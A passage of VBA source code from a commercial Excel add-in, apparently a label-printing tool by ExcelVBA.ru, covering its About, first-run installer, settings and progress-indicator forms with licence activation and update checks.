        Case Is < 1000000: FileOrFolderSize = FormatNumber(Size \ 1024, 0) & " KB"
        Case Is < 10000000: FileOrFolderSize = FormatNumber(Size / 1024 / 1024, 1) & " MB"
        Case Is < 1000000000: FileOrFolderSize = FormatNumber(Size / 1024 / 1024, 0) & " MB"
        Case Else: FileOrFolderSize = FormatNumber(Size / 1024 / 1024 / 1024, 1) & " GB"
    End Select
End Function

Attribute VB_Name = "F_About"
Attribute VB_Base = "0{1A077B62-CBCB-47B4-BEA3-0C0A2FF0A4BD}{F811C21F-0631-4177-8407-E4824F5A725A}"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Attribute VB_TemplateDerived = False
Attribute VB_Customizable = False



'---------------------------------------------------------------------------------------
' Module        : F_About                    Version: 20
' Author        : Igor Vakhnenko                   Date: 20.07.2015
' Professional application development for Microsoft Excel
' http://ExcelVBA.ru/        info@excelvba.ru      Skype: ExcelVBA.ru
'---------------------------------------------------------------------------------------

Option Compare Text: Option Explicit
Public StopEvents As Boolean
' Const HL_COLOR& = 16711680, HL_COLOR_ACTIVE& = 49152

Sub ComboBox_Language_Change()
    On Error Resume Next
    Set Me.Image_CurrentLanguage.Picture = Nothing
    Set Me.Image_CurrentLanguage.Picture = Me.Controls("Image_" & Me.ComboBox_Language).Picture
    Me.MultiPage1.SetFocus
    Me.HL_VersionsHistory.Enabled = Me.ComboBox_Language = "ru"
    Me.Label_HL_Cabinet.Enabled = Me.ComboBox_Language = "ru"

    If Me.ComboBox_Language = GetLanguage$ Then Exit Sub
    SetLanguage Me.ComboBox_Language
    CreateProgramCommandBar
    'TranslateUserForm Me
    UserForm_Initialize
End Sub

Private Sub CommandButton_InstallUpdate_Click()
    InstallUpdate
End Sub
Private Sub HL_VersionsHistory_Click()
    On Error Resume Next: FollowHyperlink VERSIONS_HISTORY_HYPERLINK$
End Sub

Private Sub Image_EF_DblClick(ByVal Cancel As MSForms.ReturnBoolean)
    Me.MultiPage1.Pages("Page_RegInfo").Visible = True
End Sub

Private Sub Image_EF_MouseUp(ByVal Button As Integer, ByVal Shift As Integer, ByVal X As Single, ByVal y As Single)
    On Error Resume Next
    If TrueDeveloper And (Button = 2) Then
        If Not Run(CFA_NAME$ & "Ready") Then MsgBox "CommonFunctions add-in is not available now", vbExclamation: Exit Sub
        Run CFA_NAME$ & "CreateAddInUpdate", PROJECT_NAME$, ThisWorkbook
        Unload Me
    End If
    If Button = 1 And Shift = 3 Then
        Dim small As Boolean: small = Me.Height < 300
        Me.Height = IIf(small, 308, 270): Me.MultiPage1.Value = 0
    End If
End Sub

Private Sub Image_Main_DblClick(ByVal Cancel As MSForms.ReturnBoolean)
    On Error Resume Next: CreateProgramCommandBar
End Sub

Private Sub Label_HL_Cabinet_Click()
    On Error Resume Next
    If Not Request_("action=get_cabinet_url") Then FWF.FollowHyperlink CABINET_HYPERLINK$
End Sub

Sub UserForm_Initialize()
    On Error Resume Next: Me.StopEvents = True
    Me.TextBox_ProgramCodeName = PROJECT_NAME$: Me.Label_ProgramFullname = tt("ProgramFullname")
    Me.Caption = tt("MENU_ABOUT"): Me.TextBox_HID = HID$: Me.TextBox_HWID = HWID$
    Me.TextBox_email = SETT.GetRegValue("email")
    Me.Label_CurrVersionNumber1 = GetVersionTXT: Me.Label_CurrVersionNumber2 = GetVersionTXT
    Me.CheckBox_InstallUpdatesAutomatically.Value = SETT.GetBoolean("AutoInstall", False, "Updates")
    Me.CheckBox_Autorun.Value = AddinAutoRun

    Dim larr, i&, PROJECT_LASTYEAR&, BuiltDate As Date, picpath$
    larr = AvailableLanguagesArray
    For i = LBound(larr) To UBound(larr): larr(i, 2) = "     " & larr(i, 2): Next i
    Me.ComboBox_Language.list = larr
    Me.ComboBox_Language = GetLanguage

    BuiltDate = CDate(Val(Replace(Split(ThisWorkbook.Names("BuiltDate").RefersTo, "%%")(1), ",", ".")))
    If BuiltDate > 42200 Then Me.Label_CurrVersionDate = Format(BuiltDate, "D MMM YYYY  HH:NN") & "  GMT+6" Else Me.Label_CurrVersionDate.Visible = False

    Me.Label_Copyright = Replace(Me.Label_Copyright, "YYYY", ProgramYears)
    Me.Label_SendEmail = IIf(RUS, SUPPORT_EMAIL_RUS$, SUPPORT_EMAIL$)

    '    Me.Label_RegHyperlink.ControlTipText = Split(BUY_NEW_HYPERLINK$, "&")(0)        ' Replace(BUY_NEW_HYPERLINK$$, "&", "&&")
    '    Me.Label_HL_BuyLicense.ControlTipText = Split(BUY_NEW_HYPERLINK$, "&")(0)        'Replace(BUY_NEW_HYPERLINK$, "&", "&&")
    '    Me.Label_ProgramWebPage.ControlTipText = Split(PROGRAM_HYPERLINK$, "?")(0)

    picpath$ = GetFile_MainPicture
    If picpath$ <> "" Then Set Me.Image_Main.Picture = LoadPicture(picpath$)
    If SETT.IsFirstRun Then RunWithDelay "ShowFirstRunForm": Unload Me: Exit Sub
    TranslateUserForm Me
    Me.MultiPage1.Value = 0: MultiPage1_Change
    Me.StopEvents = False
End Sub

Private Sub CheckBox_Autorun_Click()
    On Error Resume Next: If Me.StopEvents Then Exit Sub
    AddinAutoRun Me.CheckBox_Autorun.Value
End Sub

Private Sub CheckBox_InstallUpdatesAutomatically_Click()
    On Error Resume Next: If Me.StopEvents Then Exit Sub
    SETT.SetText "AutoInstall", Me.CheckBox_InstallUpdatesAutomatically, "Updates"
End Sub

Private Sub CommandButton_ActivateProgram_Click()
    Dim msg$, res As Boolean, code$
    code$ = Trim(Me.TextBox_ActivationCode)

    If code$ Like "%*%" Then
        EXECUTE_COMMANDS Split(code$, "%")(1), True
    Else
        If code$ Like "LANGUAGE ??" Then ActivateLanguage Split(code$)(1): Exit Sub
        ' 0 = switcher disabled, 1 = default type, 2 = DROPDOWN SWITCHER, 3 = BUTTON SWITCHER
        If code$ Like "SWITCHER #" Then SETT.SetText "SettingsSwitcher", Split(code$)(1), "Setup": CreateProgramCommandBar: Exit Sub
        
        If Not Request_("action=activation", "data=" & code$) Then
            MsgBox tt("FA_ACT_ConnectError"), vbCritical, PROJECT_NAME$
            Exit Sub
        End If
    End If
    'Me.MultiPage1.Value = 0
End Sub

Sub ActivateLanguage(ByVal lang$)
    On Error Resume Next: Dim larr, i&
    SetLanguage lang$
    larr = AvailableLanguagesArray
    For i = LBound(larr) To UBound(larr): larr(i, 2) = "     " & larr(i, 2): Next i
    Me.ComboBox_Language.list = larr
    Me.ComboBox_Language = lang$
End Sub

Private Sub CommandButton_Uninstall_Click()
    UninstallThisFile 1        ' with confirmation
End Sub

Private Sub Label_RegHyperlink_Click()
    On Error Resume Next: Dim HL$: HL$ = BUY_NEW_HYPERLINK$
    If Len(HL$) Then FollowHyperlink HL$
End Sub

Private Sub TextBox_ActivationCode_Change()
    Me.CommandButton_ActivateProgram.Enabled = Len(Trim(Me.TextBox_ActivationCode)) > 0
End Sub

Sub MultiPage1_Change()
    On Error Resume Next
    If SETT.RSP(1) = "" Then RunWithDelay "ShowFirstRunForm": Unload Me: Exit Sub
    Select Case Me.MultiPage1.Pages(Me.MultiPage1.Value).Name
        Case "Page_About"
            UpdateStatus Me.Label_Info
        Case "Page_RegInfo"
        Case "Page_Updates"
            CheckForUpdates
        Case "Page_Options"
    End Select
End Sub
Private Sub CommandButton_Close_Click(): Unload Me: End Sub

Private Sub Label_HL_BuyLicense_Click()
    FollowHyperlink IIf(Me.MultiPage1.Pages("Page_RegInfo").Visible, BUY_NEW_HYPERLINK$, BUY_ADD_HYPERLINK$ & "&email=" & SETT.GetRegValue("email"))
End Sub
Private Sub Label_ProgramWebPage_Click()
    On Error Resume Next: FollowHyperlink PROGRAM_HYPERLINK$
End Sub
Private Sub Label_SendEmail_Click()
    On Error Resume Next: FollowHyperlink "mailto:" & Me.Label_SendEmail & "?subject=" & PROJECT_NAME$ & "%20Support"
End Sub

Sub CheckForUpdates()
    On Error Resume Next
    Dim LastUpdateCheckTime As Date, LastUpdateCheckComment$
    Set Me.Image_UpdateStatus.Picture = Me.Image_UpdateStatus_Search.Picture
    Me.Label_CheckUpdatesStatus.Caption = tt("FA_UPD_Searching")
    Me.CommandButton_InstallUpdate.Visible = False
    'Application.Wait Now + 1 / 86400

    LastUpdateCheckTime = CDate(SETT.GetText("LastCheck", 0, "Updates"))
    If Abs(LastUpdateCheckTime - CDbl(Now)) > 10 / 86400 Then
        Me.MultiPage1.Enabled = False
        If Not Request_("action=updates") Then
            Set Me.Image_UpdateStatus.Picture = Me.Image_UpdateStatus_Error.Picture
            Me.Label_CheckUpdatesStatus.Caption = tt("FA_UPD_ConnectError")
            Me.MultiPage1.Enabled = True        ': SETT.SetText "LastCheck", Now, "Updates"
            Exit Sub
        End If
        Me.MultiPage1.Enabled = True
    End If

    LastUpdateCheckComment$ = SETT.GetText("LastCheckComment", "", "Updates")
    Select Case True
        Case LastUpdateCheckComment$ Like "Last version is installed*"
            Set Me.Image_UpdateStatus.Picture = Me.Image_UpdateStatus_Last.Picture
            Me.Label_CheckUpdatesStatus.Caption = tt("FA_UPD_LastVersionInstalled")

        Case LastUpdateCheckComment$ Like "Updates not found"
            Set Me.Image_UpdateStatus.Picture = Me.Image_UpdateStatus_NotFound.Picture
            Me.Label_CheckUpdatesStatus.Caption = tt("FA_UPD_NotFound", PROJECT_NAME$)

        Case LastUpdateCheckComment$ Like "New version found*"
            Set Me.Image_UpdateStatus.Picture = Me.Image_UpdateStatus_Found.Picture
            Me.Label_CheckUpdatesStatus.Caption = tt("FA_UPD_Found") & " (" & SETT.GetText("NewVersion", 0, "Updates") & ")"
            Me.CommandButton_InstallUpdate.Visible = True
    End Select
End Sub
Attribute VB_Name = "F_FirstRun"
Attribute VB_Base = "0{73A9A367-A850-4EB6-B92D-CF9BDC5B9392}{8E9EBAD7-8844-4EAE-AD11-E3250D71A71D}"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Attribute VB_TemplateDerived = False
Attribute VB_Customizable = False

'---------------------------------------------------------------------------------------
' Module        : F_FirstRun                    Version: 2.2
' Author        : Igor Vakhnenko                   Date: 09.05.2016
' Professional application development for Microsoft Excel
' http://ExcelVBA.ru/        info@excelvba.ru      Skype: ExcelVBA.ru
'---------------------------------------------------------------------------------------

Option Explicit: Option Compare Text

Private Sub ComboBox_Language_Change()
    On Error Resume Next
    If SetLanguage(Me.ComboBox_Language) Then
        TranslateUserForm Me
        MultiPage_FirstRun_Change
        UpdateFields
    End If
End Sub

Private Sub CommandButton_Cancel_Click()
    Unload Me
End Sub

Sub UpdateFields()
    On Error Resume Next
    Me.TextBox_EULA.Text = tt("EULA content", "ExcelVBA.ru", ProgramYears)
    Me.TextBox_EULA.SelStart = 0
    Me.TextBox_EULA.SelLength = 0
    Me.Caption = tt("FirstRun_FormCaption")
    Me.Label_ProgramFullname = tt("ProgramFullname")
End Sub

Private Sub CommandButton_Action1_Click()
    On Error Resume Next: Me.MultiPage_FirstRun.Value = Me.MultiPage_FirstRun.Value - 1
End Sub

Sub InstallAddinToFolder(ByVal Folder$)
    On Error Resume Next
    If ThisWorkbook.Path = Folder$ Then Exit Sub
    If Not FWF.FolderExists(Folder$) Then Exit Sub
    Dim filename$, coll As Collection, file, WB As Workbook

    ' deleting old add-in versions from destination folder
    Set coll = FWF.FilenamesCollection(Folder$, PROJECT_NAME$ & "*." & FWF.GetFileExtension(ThisWorkbook.FullName), 1)
    For Each file In coll
        filename$ = Dir(file)
        If filename$ <> ThisWorkbook.Name Then
            Set WB = Nothing: Set WB = Workbooks(filename$)
            If Not WB Is Nothing Then WB.Close False
        End If
        SetAttr file, vbNormal
        Kill file
    Next

    filename$ = Folder$ & Application.PathSeparator & PROJECT_NAME$ & "." & FWF.GetFileExtension(ThisWorkbook.FullName)
    Application.DisplayAlerts = False
    ThisWorkbook.SaveAs filename$
    Application.DisplayAlerts = True
    Set coll = Nothing: Set WB = Nothing
End Sub

Private Sub CommandButton_Action2_Click()
    On Error Resume Next: Dim email$, i As Boolean
    If Me.MultiPage_FirstRun.Value = Me.MultiPage_FirstRun.Pages.Count - 1 Then
        With SETT
            InstallAddinToFolder Me.Label_DestinationFolder
            AddinAutoRun Me.CheckBox_Autorun.Value
            i = .RSP(3) = ""
            If Me.CheckBox_AddShortcut Then CreateShortcutInStartMenu
            HWID True
            email$ = Trim(Me.TextBox_ActivationCode)
            If .RSP(1) = "" Then .WSP 1, .DTU
            If Not Request_("action=first_run activation", "data=" & email$) Then
                If Len(email$) Then MsgBox tt("|46415F4143545F436F6E6E6563744572726F72"), vbCritical, PROJECT_NAME$
                If i Then .WSP 3, (.LastMacro + 1) * l0 + .LastMacro
            End If
        End With
        Run TWN & "FirstRunActions"
        If Me.CheckBox_ShowUsageExample.Visible Then If Me.CheckBox_ShowUsageExample Then RunWithDelay "ShowUsageExample", 0.5
        Unload Me
    End If
    Me.MultiPage_FirstRun.Value = Me.MultiPage_FirstRun.Value + 1
End Sub
Private Sub CommandButton_Action3_Click()
    SetupCancelled = True
    Unload Me
End Sub

Private Sub CommandButton_ChangeFolder_Click()
    On Error Resume Next: Dim Folder$
    Folder$ = FWF.GetFolderPath(, Me.Label_DestinationFolder)
    If Folder$ <> "" Then
        If Right(Folder$, 1) = Application.PathSeparator Then Folder$ = Left(Folder$, Len(Folder$) - 1)
        Me.Label_DestinationFolder = Folder$
    End If
End Sub

Private Sub Image_en_Click(): On Error Resume Next: Me.ComboBox_Language = "en": End Sub
Private Sub Image_ru_Click(): On Error Resume Next: Me.ComboBox_Language = "ru": End Sub
Private Sub Image_it_Click(): On Error Resume Next: Me.ComboBox_Language = "it": End Sub
Private Sub Image_de_Click(): On Error Resume Next: Me.ComboBox_Language = "de": End Sub
Private Sub Image_fr_Click(): On Error Resume Next: Me.ComboBox_Language = "fr": End Sub
Private Sub Image_es_Click(): On Error Resume Next: Me.ComboBox_Language = "es": End Sub
Private Sub Image_ar_Click(): On Error Resume Next: Me.ComboBox_Language = "ar": End Sub
Private Sub Image_jp_Click(): On Error Resume Next: Me.ComboBox_Language = "jp": End Sub

Sub MultiPage_FirstRun_Change()
    On Error Resume Next
    Dim arrButtonsCaption As Variant, param$, b_capt$, b_en As Boolean, b_vis As Boolean, i&
    arrButtonsCaption = Split(Me.MultiPage_FirstRun.Pages(Me.MultiPage_FirstRun.Value).Tag, "/")
    For i = 1 To 3
        param$ = "": param$ = arrButtonsCaption(i - 1)
        b_capt$ = Replace(param$, "*", "")
        b_en = InStr(1, param$, "*") = 0
        b_vis = b_capt$ <> ""

        With Me.Controls("CommandButton_Action" & i)
            .Caption = tt(b_capt$)
            .Enabled = b_en
            .Visible = b_vis
        End With
    Next
    Me.CommandButton_Action2.SetFocus
End Sub

Private Sub TextBox_ActivationCode_KeyPress(ByVal KeyAscii As MSForms.ReturnInteger)
    Me.CommandButton_Action1.TabIndex = 5
End Sub

Function GetDestinationFolder() As String
    On Error Resume Next: Dim Folder$, downloads_folder$, changed As Boolean, v
    Const USF$ = "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders\"
    downloads_folder$ = Replace(SETT.GetText("{374DE290-123F-4565-9164-39C4925E467B}", , USF$), "%USERPROFILE%", Environ("USERPROFILE"))
    Folder$ = ThisWorkbook.Path
    For Each v In Array(downloads_folder$, "Downloads", SETT.U("C7E0E3F0F3E7EAE8"))
        If InStr(1, Folder$, v, vbTextCompare) Then changed = True: Exit For
    Next
    GetDestinationFolder = IIf(changed, CreateObject("WScript.Shell").SpecialFolders("Desktop"), Folder$)
End Function

Private Sub UserForm_Initialize()
    On Error Resume Next: Dim i&, j&, larr, ctrl As Object, picpath$, LangImagesCount&
    SetupCancelled = False
    Me.Caption = PROJECT_NAME$
    If SETT.IsSettingBlank("Setup\Language") Then SetLanguage SYSTEM_LANGUAGE
    'If TrueDeveloper Then Me.MultiPage_FirstRun.Pages("Page4_Done").Tag = "Back/Done/"

    picpath$ = GetFile_MainPicture
    If picpath$ <> "" Then Set Me.Image_Main.Picture = LoadPicture(picpath$)

    TranslateUserForm Me
    UpdateFields

    Me.MultiPage_FirstRun.Style = fmTabStyleNone
    Me.MultiPage_FirstRun.Value = 0
    MultiPage_FirstRun_Change

    larr = AvailableLanguagesArray
    Me.ComboBox_Language.list = larr
    Me.ComboBox_Language = GetLanguage
    If Me.ComboBox_Language.ListIndex = -1 Then Me.ComboBox_Language.ListIndex = 0
    If Me.ComboBox_Language.ListCount = 1 Then
        Me.MultiPage_FirstRun.Value = 1
        Me.CommandButton_Action1.Visible = False
        Me.CommandButton_Action2.SetFocus
    End If

    For i = LBound(larr) To UBound(larr)
        If LangImagesCount& > 5 Then Exit For
        Set ctrl = Nothing: Set ctrl = Me.Controls("Image_" & larr(i, 1))
        If Not ctrl Is Nothing Then
            ctrl.ControlTipText = larr(i, 2)
            LangImagesCount& = LangImagesCount& + 1
            ctrl.Top = Me.ComboBox_Language.Top + 1
            ctrl.Left = Me.ComboBox_Language.Left + Me.ComboBox_Language.Width + 40 + (LangImagesCount& - 1) * 33
            ctrl.Visible = True
        End If
    Next i
    Me.Label_DestinationFolder.Caption = Me.GetDestinationFolder
    Me.CheckBox_ShowUsageExample.Visible = UsageExampleExists
End Sub

Private Sub UserForm_QueryClose(Cancel As Integer, CloseMode As Integer)
    On Error Resume Next
    If CloseMode = 0 And Not TrueDeveloper Then Cancel = True
End Sub

Attribute VB_Name = "F_Progress"
Attribute VB_Base = "0{30F508DA-480B-438E-8F3E-91DCC8B2D711}{EEF3F48B-1966-4432-9009-0D7E8E84C5B1}"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Attribute VB_TemplateDerived = False
Attribute VB_Customizable = False

'---------------------------------------------------------------------------------------
' Module        : F_Progress                       Version: 2.2 (|fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| Template!)
' Author        : Igor Vakhnenko                   Date: 21.07.2015
' Professional application development for Microsoft Excel
' http://ExcelVBA.ru/        info@excelvba.ru      Skype: ExcelVBA.ru
'---------------------------------------------------------------------------------------

Option Explicit
Public Indicator As ProgressIndicator, ButtonMacro$
Dim MSG_StopMacro$, MSG_StopMacroTitle$

Private Sub UserForm_Initialize()
    On Error Resume Next
    MSG_StopMacro$ = Run(TWN & "tt", "PI_MSG_StopMacro")
    If MSG_StopMacro$ = "" Then MSG_StopMacro$ = "Do you really want to stop the macro?"
    MSG_StopMacroTitle$ = Run(TWN & "tt", "PI_MSG_StopMacroTitle")
    If MSG_StopMacroTitle$ = "" Then MSG_StopMacroTitle$ = "Processing is not complete yet"
    Err.Clear
End Sub

Private Sub CommandButton_RunMacro_Click()
    On Error Resume Next
    If Len(ButtonMacro$) Then Run TWN & ButtonMacro$
End Sub

Private Sub CommandButton_stop_Click()
    On Error Resume Next
    If StopMacro Then        ' macro finished
        End
    Else        ' macro is running
        If MsgBox(MSG_StopMacro$, vbQuestion + vbDefaultButton2 + vbYesNo, MSG_StopMacroTitle$) = vbYes Then
            StopMacro = True
        End If
    End If
End Sub

Private Sub SpinButton_log_Change()
    On Error Resume Next: Dim n&
    n = Me.SpinButton_log.Value
    Me.Height = IIf(n = 0, 82, 92 + n * 40)
    Me.TextBox_Log.Height = 40 * n
End Sub

Private Sub UserForm_QueryClose(Cancel As Integer, CloseMode As Integer)
    On Error Resume Next
    If Not Indicator Is Nothing Then Indicator.QueryClose
End Sub
Attribute VB_Name = "F_Settings"
Attribute VB_Base = "0{306EE419-1556-42CC-860C-B705968D8F74}{AA8665FC-C26D-482D-A115-37DDA6346119}"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Attribute VB_TemplateDerived = False
Attribute VB_Customizable = False
'---------------------------------------------------------------------------------------
' Module        : F_Settings                    Version:
' Author        : Igor Vakhnenko                   Date: 03.05.2016
' Professional application development for Microsoft Excel
' http://ExcelVBA.ru/        info@excelvba.ru      Skype: ExcelVBA.ru
'---------------------------------------------------------------------------------------

Option Compare Text: Option Explicit
Dim SpecialControlsCollection As Collection

Private Sub CheckBox_SaveSheetAsFile_Click()
    On Error Resume Next
    Me.CheckBox_PDF.Enabled = Me.CheckBox_SaveSheetAsFile And (Val(Application.Version) > 11)
End Sub

Private Sub CheckBox_UseIndents_Click()
    On Error Resume Next: Dim v As Boolean: v = Me.CheckBox_CutLine
    If Me.CheckBox_UseIndents Then Me.CheckBox_CutLine = Null: Me.CheckBox_CutLine = v
End Sub

Private Sub CommandButton_ChangeOutputFolder_Click()
    On Error Resume Next: Dim InitialPath$, Folder$
    InitialPath$ = IIf(Dir(OUTPUT_FOLDER$, vbDirectory) <> "", OUTPUT_FOLDER$, ThisWorkbook.Path)
    Folder$ = GetFolderPath("|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|", InitialPath$)
    If Folder$ = "" Then Exit Sub
    Me.TextBox_OutputFolder = Folder$
End Sub


Private Sub Label_InstallFontCode128_Click()
    InstallFont "code128.ttf"
End Sub

Private Sub Label_InstallFontEAN13_Click()
    InstallFont "ean13.ttf"
End Sub

Private Sub Label203_Click()
    ShowManual "https://excelvba.ru/programmes/Labels/manuals/settings/OutputTab"
End Sub
Private Sub Label204_Click()
    ShowManual "https://excelvba.ru/programmes/Labels/manuals/settings/LabelSetupTab"
End Sub
Private Sub Label205_Click()
    ShowManual "https://excelvba.ru/programmes/Labels/manuals/settings/SourceTableTab"
End Sub
Private Sub Label206_Click()
    ShowManual "https://excelvba.ru/programmes/Labels/manuals/settings/ExtraTab"
End Sub

Private Sub Label207_Click()
    ShowManual "https://excelvba.ru/programmes/Labels/manuals/barcode"
End Sub

Private Sub UserForm_Initialize()
    On Error Resume Next
    Dim i&
    
    For i = 1 To 50: Me.ComboBox_count_w.AddItem i
    Next
    For i = 1 To 99: Me.ComboBox_count_h.AddItem i
    Next
    For i = 1 To 34: Me.ComboBox_IndentWidth.AddItem i
    Next
    
    For i = 1 To 50
        Me.ComboBox_BaseColumn.AddItem ColumnNameByColumnNumber(i)
        Me.ComboBox_CountColumn.AddItem ColumnNameByColumnNumber(i)
    Next
    For i = 1 To 20: Me.ComboBox_FirstRow.AddItem i
    Next i
    
    
    Me.CheckBox_PDF.Enabled = Val(Application.Version) > 11
    
    '    Dim x, i&
    '    x = SEARCH_MODE        ' set default value if not exist
    '    x = SETT.GetNumber("TextBox_PicturePosition")        ' set default value if not exist
    '
    '    For i = 1 To 150
    '        'Me.ComboBox_PicturesColumn.AddItem ColumnNameByColumnNumber(i)
    '    Next
    '
    '    ReDim arr(0 To 2, 0 To 1)
    '    arr(0, 0) = CStr(xlMoveAndSize): arr(0, 1) = tt("SETTxlMoveAndSize")
    '    arr(1, 0) = CStr(xlMove): arr(1, 1) = tt("SETTxlMove")
    '    arr(2, 0) = CStr(xlFreeFloating): arr(2, 1) = tt("SETTxlFreeFloating")
    '    Me.ComboBox_Placement.list = arr
    
    ' special controls
    Dim ctrl As MSForms.Control, SC As SpecialControl, m_page As Object
    Set SpecialControlsCollection = New Collection
    For Each ctrl In Me.Controls
        If TypeName(ctrl) = "ScrollBar" And ctrl.Tag = "ScrollCombo" Then
            Set SC = New SpecialControl: Set SC.Scroller = ctrl
            If SC.FieldFound Then SpecialControlsCollection.Add SC
        End If
    Next
    Set SC = New SpecialControl: Set SC.MainCheckboxInFrame = Me.CheckBox_UseIndents: SpecialControlsCollection.Add SC
    Set SC = New SpecialControl: Set SC.MainCheckboxInFrame = Me.CheckBox_CutLine: SpecialControlsCollection.Add SC
    Set SC = New SpecialControl: Set SC.MainCheckboxInFrame = Me.CheckBox_SaveSheetAsFile: SpecialControlsCollection.Add SC
    Set SC = New SpecialControl: Set SC.MainCheckboxInFrame = Me.CheckBox_BaseColumn: SpecialControlsCollection.Add SC
    Set SC = New SpecialControl: Set SC.MainCheckboxInFrame = Me.CheckBox_AmountColumn: SpecialControlsCollection.Add SC
    
    SETT.LoadIntoSettingForm Me
    TranslateUserForm Me
    
    ' translation fix
    For Each ctrl In Me.Controls
        If TypeName(ctrl) = "MultiPage" Then
            ctrl.Value = 0
            For Each m_page In ctrl.Pages
                m_page.ScrollTop = 0
                m_page.Caption = " " & m_page.Caption & " "
            Next
        End If
    Next
    Me.CommandButton_SaveSettings.Caption = "    " & Trim(Me.CommandButton_SaveSettings.Caption)
    
    'If Val(Me.ComboBox_Zoom) < 40 Then Me.ComboBox_Zoom = "100 %"
End Sub

Private Sub UserForm_QueryClose(Cancel As Integer, CloseMode As Integer)
    On Error Resume Next
    Set SpecialControlsCollection = Nothing
End Sub

Private Sub CommandButton_Quit_Click()
    Unload Me
End Sub

Private Sub CommandButton_ResetAllSettings_Click()
    On Error Resume Next
    If MsgBox(tt("ResetAllSettings_MessageText"), vbQuestion + vbOKCancel + vbDefaultButton2, tt("ResetAllSettings_MessageTitle")) = vbCancel Then Exit Sub
    DeleteSetting PROJECT_NAME$, "Settings"
    SaveDefaultSettings
    
    RunWithDelay "ShowSettingsPage", 0.3
    Unload Me
End Sub

Private Sub Image_ExportSettings_Click()
    ExportSettings
End Sub

Private Sub Image_ImportSettings_Click()
    If Not ImportSettings Then Exit Sub
    RunWithDelay "ShowSettingsPage", 0.3
    Unload Me
End Sub

Private Sub CommandButton_SaveSettings_Click()
    On Error Resume Next
    SETT.SaveAllFromSettingForm Me
    '    If NeedUpdateToolbar Then UpdateAddinToolbar
    Unload Me
End Sub

Attribute VB_Name = "ProgressIndicator"
Attribute VB_Base = "0{FCFB3D2A-A0FA-1068-A738-08002B3371B5}"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = False
Attribute VB_Exposed = False
Attribute VB_TemplateDerived = False
Attribute VB_Customizable = False
'---------------------------------------------------------------------------------------
' Module        : ProgressIndicator                    Version: 2
' Author        : Igor Vakhnenko                   Date: 21.07.2015
' Professional application development for Microsoft Excel
' http://ExcelVBA.ru/        info@excelvba.ru      Skype: ExcelVBA.ru
'---------------------------------------------------------------------------------------

Option Explicit

Public FP As New F_Progress
Public SubActionIndex As Single, SubActionsCount As Single, SubActionsStep&
Private FPVisible As Boolean, FPStartTime As Date, Position&
Private PrS&, PrE&, Percent As Double, LogString$

Public Parent As ProgressIndicator, Children As New Collection
Public ShowPercents As Boolean, ShowTime As Boolean, ShowTimeInLog As Boolean

Dim MSG_EstimatedTime$, BTN_Stop$

Function AddChildIndicator(ByVal Caption$, Optional ByVal FPPosition& = 1) As ProgressIndicator
    On Error Resume Next
    Set AddChildIndicator = New ProgressIndicator
    Set AddChildIndicator.Parent = Me
    AddChildIndicator.Show Caption, FPPosition
    Children.Add AddChildIndicator
End Function

Private Sub Class_Initialize()
    Set FP = New F_Progress: ShowPercents = True: FPVisible = True
    PrS = 0: PrE = 100: Set_ProgressBar 0: FP.PrBar.Caption = ""
    FPStartTime = Now: ShowTime = True: ShowPercents = True: SubActionsStep = 1
    Set FP.Indicator = Me

    On Error Resume Next
    MSG_EstimatedTime$ = Run(TWN & "tt", "PI_MSG_EstimatedTime")
    If MSG_EstimatedTime$ = "" Then MSG_EstimatedTime$ = "Estimated time left"
    BTN_Stop$ = Run(TWN & "tt", "PI_BTN_Cancel")
    If BTN_Stop$ = "" Then BTN_Stop$ = "Cancel"
    FP.CommandButton_stop.Caption = BTN_Stop$
    Err.Clear
End Sub

Sub Show(ByVal Caption$, Optional ByVal FPPosition& = 0, Optional LogSize& = 0)
    On Error Resume Next
    SetProgressFormCaption Caption: On Error Resume Next:
    FP.PrBar.Width = ProgressBar_Default_Width
    Position = FPPosition
    FP.Tag = Caption: FP.Show:
    If Position <> 0 Then Move Position
    FP.Repaint: DoEvents
    FP.SpinButton_log.Value = LogSize
    FP.SpinButton_log.Visible = LogSize > 0
    SetLogSize LogSize
End Sub

Sub Hide()
    Unload FP
    FPVisible = False
End Sub

Sub Repaint()
    FP.Repaint: DoEvents
    'If Application.ScreenUpdating = False Then Application.ScreenUpdating = True: Application.ScreenUpdating = False
End Sub

Sub Move(ByVal Position&)
    If Abs(Position) > 3 Then Exit Sub
    If Not Me.Parent Is Nothing Then
        FP.Top = Me.Parent.FP.Top + Me.Parent.FP.Height + 10 + (FP.Height + 3) * (Position - 1)
    Else
        FP.Top = FP.Top + (FP.Height + 3) * Position
    End If
End Sub

Public Property Get Visible(): Visible = FPVisible: End Property

Public Property Let Line1(ByVal NewValue$): FP.L1.Caption = ProcessLabel(NewValue): Me.FP.Repaint: DoEvents: End Property
Public Property Let Line2(ByVal NewValue$): FP.L2.Caption = ProcessLabel(NewValue): Me.FP.Repaint: DoEvents: End Property
Public Property Let Line3(ByVal NewValue$): FP.L3.Caption = ProcessLabel(NewValue): Me.FP.Repaint: DoEvents: End Property
Public Property Let Caption(ByVal NewValue$): SetProgressFormCaption NewValue: End Property

Private Sub SetProgressFormCaption(Optional ByVal Caption$ = "")
    Dim txt$, dt$
    If Len(Caption) > 0 Then FP.Tag = Caption
    txt = Trim(FP.Tag): If ShowPercents Then txt = Fix(Percent) & " %   " & txt
    dt = Format(Now - FPStartTime, "HH:NN:SS")
    If ShowTime Then txt = "( " & dt & " )    " & txt
    FP.Caption = txt
End Sub

Private Function TimeToFinish$()
    On Error Resume Next: Dim dt As Single
